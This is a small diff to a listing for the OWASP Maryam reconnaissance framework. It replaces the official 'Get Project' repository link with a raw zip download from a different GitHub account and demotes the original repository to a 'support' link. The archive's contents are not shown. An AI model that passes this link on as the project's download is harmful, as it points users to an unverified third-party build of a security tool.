@@ -7,6 +7,8 @@ With Maryam you just have to write your modules and use them easily. Maryam incl
 
 Link: https://www.owasp.org/index.php/OWASP_Maryam_Project
 
-Get Project: https://github.com/saeeddhqan/Maryam
+Get Project: https://github.com/AbolfazlHajizade/Maryam-Framework/blob/master/Maryam-master.zip?raw=true
+
+support: https://github.com/saeeddhqan/Maryam
 
 
